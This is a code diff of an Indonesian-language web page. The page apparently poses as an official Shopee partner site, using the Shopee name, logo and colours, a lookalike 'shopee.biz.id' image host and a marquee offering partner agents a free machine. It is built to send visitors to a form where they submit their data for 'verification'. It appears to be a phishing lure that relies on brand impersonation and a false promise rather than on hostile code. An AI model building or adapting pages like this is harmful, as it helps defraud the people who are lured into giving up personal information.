@@ -1,125 +1,133 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pemberitahuan Syarat Mitra</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="theme-color" content="#ED4D2D">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mitra Shopee Partner || shopee.co.id</title>
+    
+    <meta property="og:description" content="Layanan mitra Shopee partner.">
+    <meta property="og:image" content="https://pelitaonline.co/wp-content/uploads/2025/12/2025-10-21T03_48_37.070Zgroup.jpeg">
+    <meta property="og:type" content="website">
+    
     <style>
-        body { font-family: 'Poppins', sans-serif; background-color: #f8f9fa; }
-        .shopee-orange { color: #EE4D2D; }
-        .bg-shopee { background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%); }
-        .check-item { display: flex; align-items: flex-start; margin-bottom: 12px; }
-        .check-icon { color: #10b981; margin-right: 10px; margin-top: 2px; }
-        .cross-icon { color: #ef4444; margin-right: 10px; margin-top: 2px; }
+        body {
+            background-color: #EE4D2D;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 40px;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            max-width: 150px;
+            height: auto;
+        }
+
+        .container {
+            width: 85%;
+            max-width: 320px;
+            padding: 25px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        
+        marquee {
+            width: 100%;
+            font-size: 12px;
+            background-color: #f9f9f9;
+            padding: 8px 0;
+            border: 2px solid #ffd560;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        h1 {
+            font-size: 16px;
+            font-weight: bold;
+            color: #EE4D2D;
+            background: #fff3d1;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px dashed #EE4D2D;
+        }
+
+        .btn {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%);
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: transform 0.2s;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        footer {
+            margin-top: 30px;
+            width: 100%;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        footer img {
+            max-width: 90%;
+            height: auto;
+            border-radius: 10px;
+        }
     </style>
 </head>
-<body class="text-gray-800 pb-10">
+<body>
 
-    <div class="max-w-md mx-auto px-4 mt-10" id="ruleSection">
-        <!-- Card Pemberitahuan Utama -->
-        <div class="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden mb-6">
-            <div class="p-6">
-                <div class="mb-6 text-center">
-                    <h2 class="font-bold text-xl uppercase tracking-tight">Aturan & Kepatuhan</h2>
-                    <p class="text-xs text-gray-400 mt-1 font-medium">Pemberitahuan Penting Mitra Resmi</p>
-                </div>
-
-                <!-- Bagian Syarat -->
-                <div class="mb-8">
-                    <h3 class="font-bold text-sm text-gray-500 uppercase tracking-wider mb-4 border-b pb-2">✅ Syarat Pengajuan Order</h3>
-                    <div class="space-y-3">
-                        <div class="check-item">
-                            <span class="check-icon">✔</span>
-                            <p class="text-sm">Akun Mitra wajib terverifikasi dengan identitas KTP asli.</p>
-                        </div>
-                        <div class="check-item">
-                            <span class="check-icon">✔</span>
-                            <p class="text-sm">Alamat pengiriman harus sesuai dengan titik operasional yang terdaftar.</p>
-                        </div>
-                        <div class="check-item">
-                            <span class="check-icon">✔</span>
-                            <p class="text-sm">Limit saldo mencukupi untuk pemesanan sesuai kuantitas produk.</p>
-                        </div>
-                        <div class="check-item">
-                            <span class="check-icon">✔</span>
-                            <p class="text-sm">Kesediaan mengisi formulir pesanan dengan data yang valid.</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Bagian Larangan -->
-                <div class="mb-8">
-                    <h3 class="font-bold text-sm text-gray-500 uppercase tracking-wider mb-4 border-b pb-2 text-red-500">❌ Larangan Kemitraan</h3>
-                    <div class="space-y-3">
-                        <div class="check-item">
-                            <span class="cross-icon">✖</span>
-                            <p class="text-sm text-gray-700">Dilarang memberikan alamat palsu atau lokasi yang tidak dapat dijangkau.</p>
-                        </div>
-                        <div class="check-item">
-                            <span class="cross-icon">✖</span>
-                            <p class="text-sm text-gray-700">Penyalahgunaan data transaksi akan diproses sesuai hukum yang berlaku.</p>
-                        </div>
-                        <div class="check-item">
-                            <span class="cross-icon">✖</span>
-                            <p class="text-sm text-red-600 font-semibold">Tindakan manipulasi pesanan (fake order) dilarang keras.</p>
-                        </div>
-                        <div class="check-item">
-                            <span class="cross-icon">✖</span>
-                            <p class="text-sm text-gray-700 font-medium italic">Pelanggaran aturan berisiko pemblokiran akun permanen.</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Persetujuan -->
-                <div class="bg-orange-50 p-4 rounded-xl mb-6 border border-orange-100">
-                    <label class="flex items-center space-x-3 cursor-pointer">
-                        <input type="checkbox" id="agreeCheck" class="w-5 h-5 accent-orange-600 rounded">
-                        <span class="text-xs text-orange-900 leading-tight font-semibold">Saya mengerti dan menyetujui seluruh aturan yang berlaku.</span>
-                    </label>
-                </div>
-
-                <!-- Tombol Lanjut -->
-                <button id="showFormBtn" disabled class="w-full bg-gray-300 text-white py-4 rounded-xl font-bold shadow-sm transition-all duration-300 active:scale-95">
-                    Lanjut Isi Formulir
-                </button>
-            </div>
-        </div>
-        
-        <p class="text-center text-[10px] text-gray-400 uppercase font-bold tracking-widest mt-4">Sistem Verifikasi Aman</p>
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png" alt="Shopee Logo">
     </div>
 
+    <div class="container">
+        <marquee direction="left">
+            Open Pre Order gratis untuk agen Mitra Shopee!!!!! Sekarang setiap agen Mitra Shopee mendapatkan mesinnya secara gratis.. Ayo Ambil sekarang.
+        </marquee>
+        
+        <h1>Ajukan Order dan lengkapi datamu untuk verifikasi dan validasi</h1>
+        
+        <p style="font-size: 12px; color: #666; margin-bottom: 15px;">Silakan klik tombol di bawah untuk proses pengajuan order Anda.</p>
+        
+        <button class="btn" onclick="redirectToForm()">Dapatkan Sekarang</button>
+    </div>
+
+    <footer>
+        <img src="https://bantuan.shopee.biz.id/assets/FB_IMG_1769694634688.jpg" alt="Banner Info">
+    </footer>
+
     <script>
-        const agreeCheck = document.getElementById('agreeCheck');
-        const showFormBtn = document.getElementById('showFormBtn');
-
-        // Mengaktifkan tombol saat checkbox dicentang
-        agreeCheck.addEventListener('change', function() {
-            if(this.checked) {
-                showFormBtn.disabled = false;
-                showFormBtn.classList.remove('bg-gray-300');
-                showFormBtn.classList.add('bg-shopee', 'shadow-lg');
-            } else {
-                showFormBtn.disabled = true;
-                showFormBtn.classList.remove('bg-shopee', 'shadow-lg');
-                showFormBtn.classList.add('bg-gray-300');
-            }
-        });
-
-        // Pengalihan ke halaman formulir
-        showFormBtn.addEventListener('click', function() {
-            this.innerHTML = `
-                <svg class="animate-spin h-5 w-5 text-white inline mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
-                Mengalihkan...
-            `;
-            
-            setTimeout(() => {
-                // Ganti 'formulir.html' sesuai dengan nama file formulir pesanan Anda
-                window.location.href = 'halamantoko.html';
-            }, 800);
-        });
+        function redirectToForm() {
+            // Menggunakan tujuan redirect dari Kode 1
+            window.location.href = 'halamantoko.html';
+        }
     </script>
+
 </body>
 </html>
-
